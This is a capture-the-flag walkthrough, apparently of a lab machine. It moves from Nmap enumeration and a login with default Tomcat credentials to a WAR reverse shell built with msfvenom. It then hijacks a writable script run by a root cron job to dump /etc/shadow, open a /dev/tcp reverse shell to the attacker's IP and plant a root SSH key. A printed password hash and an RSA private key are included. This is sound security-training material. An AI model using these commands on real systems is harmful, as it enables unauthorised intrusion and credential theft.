# Enumeration
### Nmap
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.121.49

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
nmap -A -T4 -Pn -p22,8009,8080 10.10.121.49
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 19:07 EST
Nmap scan report for 10.10.121.49
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
```

We found 3 ports. Port 22 could allow us SSH access if we find credentials. Port 8009 contains Apache Jserv and Port 8080 seems to be the most interesting with Tomcat.

### Tomcat Web Enumeration
Lets start enumerating the Tomcat web.

```shell
http://10.10.121.49:8080/
```

If we click on Manager App (Top right of the screen under Server Status), we will be asked for credentials.

### Getting access into Tomcat Web Application Manager using default credentials

Searching on Google, we found a table with the default credentials of Tomcat:

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

Trying the default credentials there, we found a valid combination that allowed us to get access:

```shell
tomcat:s3cret
```

# Foothold
### Deploy WAR file created with msfvenom containing a reverse shell to get access
Having access to the Tomcat Web Application Manager, we can create a malicious WAR file containing a reverse shell.

Use msfvenom to create a WAR file containing a reverse shell:

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.113.193 LPORT=8443 -f war -o TotallySafeFile.war
```

After creating the file, start a nc listener:

```shell
nc -lvnp 8443
```

Then upload the TotallySafeFile.war through the Tomcat Web Application Manager (Scroll down to Deploy -> WAR file to deploy -> Browse... -> Select the TotallySafeFile.war -> Click on Deploy)

Now we can click on the /TotallySafeFile link that appeared on the list, it will get us to the following URL, activating our reverse shell:

```shell
http://10.10.121.49:8080/TotallySafeFile/
```

Giving us a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.121.49] 49000
whoami
tomcat
```

Now upgrade our shell:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@ubuntu:/$ 
```

### User Flag
Now we can get the user.txt flag:

```shell
cat /home/jack/user.txt
```
# Privilege Escalation
### id.sh bash script manipulation to get the content of root.txt flag
It seems like there is an interesting bash script on the directory of the user jack called id.sh:

```shell
cat id.sh

#!/bin/bash
id > test.txt
```

It seems to run the command id and put the contents into test.txt.

```shell
cat test.txt

uid=0(root) gid=0(root) groups=0(root)
```

Inside test.txt we can see that these are results of running the command id as root.

We can suppose that when we run id.sh, the content of id.sh gets executed as root and saved into test.txt.

It also seems like we also have permission to modify the content of the id.sh bash script:

```shell
ls -al

<SNIP>
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
<SNIP>

```

Lets try to abuse it changing the contents of id.sh to use cat on /root/root.txt:

```shell
# Use echo to rewrite id.sh with the shebang and add a new line with cat
echo '#!/bin/bash' > id.sh
echo 'cat /root/root.txt > test.txt' >> id.sh
```

Lets run id.sh now and see if we can get the root.txt flag:

```shell
bash id.sh

cat: /root/root.txt: Permission denied
```

It didnt work. Would have been too easy.

But maybe we dont need to run it, but wait for root to run it. I can guess there is a cron job running.

### Checking Cron Jobs
Lets enumerate and search for cron jobs:

```shell
cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
```

That makes sense now! There is a cron job active where root runs id.sh.

Note that when everything is set to * the cron job will run every minute, every day, every week, every month. Meaning the cron job that runs id.sh runs every minute.

This means we just need to wait after editing id.sh and root will run the commands inside id.sh and write the output into test.txt.

Now by the time we waited after editing id.sh, we can just use cat to see the root.txt inside test.txt:

```shell
cat /home/jack/test.txt
```

There is the root.txt flag!

Lets now try to get the password of root and other privilege escalation methods using the id.sh bash script.

### Getting the contents of /etc/passwd and /etc/shadow/
We can edit the contents of the id.sh as follow to get the contents of /etc/passwd and /etc/shadow on two different files:

```shell
echo '#!/bin/bash' > id.sh
echo 'cat /etc/passwd > passwd.txt' >> id.sh
echo 'cat /etc/shadow > shadow.txt' >> id.sh
```

Now wait for root to run id.sh.

It worked!

Lets check passwd.txt:

```shell
cat passwd.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
jack:x:1000:1000:tom,,,:/home/jack:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
tomcat:x:1001:1001::/opt/tomcat:/bin/bash
```

We can see that there is a x on root, so the password must be on the shadow file.

Lets check shadow.txt:

```shell
cat shadow.txt

root:!:18122:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18122:0:99999:7:::
uuidd:*:18122:0:99999:7:::
jack:$1$BH08tSd1$KCDAk8Nwn6PiV78ewyB/M1:18122:0:99999:7:::
sshd:*:18122:0:99999:7:::

```

There is an ! on root. It means the password of this account is locked, meaning we can just access the root account through SSH if we use a id_rsa. Maybe we can still use id.sh to get the id_rsa of root.

But first lets try to crack the hash of jack anyways:

```shell
# Analyze the hash type with hashid first
hashid '$1$BH08tSd1$KCDAk8Nwn6PiV78ewyB/M1'

Analyzing '$1$BH08tSd1$KCDAk8Nwn6PiV78ewyB/M1'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5

# Lets suppose its an MD5 Crypt hash, we can search for the -m on hashcat with the following command
hashcat -h | grep MD5

# There it is, it also says it starts with $1$
   500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System

# Lets see if we can crack it
hashcat -m 500 jack_hash.txt /usr/share/wordlists/rockyou.txt
```

Its taking quite long, we probably cant crack the hash of jack, as it may not be an intended way to solve this machine.

### Checking if root has an id_rsa
Lets try to get the id_rsa of root now.

First, we can try to see what are the contents inside /root/.ssh (And if it exists):

```shell
echo '#!/bin/bash' > id.sh
echo 'ls -al /root > check_root.txt' >> id.sh
echo 'ls -al /root/.ssh > check_ssh.txt' >> id.sh
```

Now we can check the files:

```shell
cat check_root.txt
cat check_ssh.txt
```

### Getting a reverse shell as root manipulating id.sh script
We can also try to get a reverse shell starting a nc listener and entering the following command inside the id.sh script

```shell
# Start nc listener
nc -lvnp 8443

# Run the following commands to enter reverse shell inside the id.sh bash script
echo '#!/bin/bash' > id.sh
echo '/bin/sh -i >& /dev/tcp/10.11.113.193/8443 0>&1' >> id.sh
```

Now wait for root to run the script and we will get an answer in our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.121.49] 49002
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

### Creating id_rsa for root and getting access using SSH
Lets try to create a id_rsa key for root using the id.sh script:

```shell
echo '#!/bin/bash' > id.sh
echo 'ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa' >> id.sh
echo 'cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys ' >> id.sh
echo 'cat /root/.ssh/id_rsa > id_rsa.txt' >> id.sh
```

Note: Remember we need to move id_rsa.pub (public key) into /root/.ssh/authorized_keys. We will use the id_rsa (private key) to log in through SSH.

Now mode id_rsa.txt or copy the content into a file called id_rsa on our Kali:
```shell
cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Give it the right permissions:

```shell
sudo chmod 600 id_rsa
```

And now we will be able to get access as root running the following command:

```shell
sudo ssh -i id_rsa root@10.10.121.49
```

It worked! We got access as root using an id_rsa key we created with the id.sh bash script:

```shell
root@ubuntu:~# whoami
root
root@ubuntu:~# cat /root/root.txt
REDACTED
```